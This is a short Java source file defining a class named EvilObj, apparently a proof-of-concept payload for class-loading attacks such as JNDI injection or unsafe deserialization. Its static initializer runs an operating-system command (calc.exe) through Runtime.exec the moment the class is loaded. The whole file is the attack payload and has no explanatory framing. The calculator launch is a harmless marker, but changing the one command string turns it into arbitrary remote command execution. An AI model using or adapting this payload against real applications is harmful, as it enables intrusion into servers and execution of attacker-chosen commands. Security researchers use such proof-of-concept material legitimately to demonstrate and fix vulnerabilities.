package com.jiuzhe.webflux;

import java.io.IOException;

public class EvilObj {
    static {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"calc.exe"};
        Process pc = null;
        try {
            pc = rt.exec(commands);
            pc.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
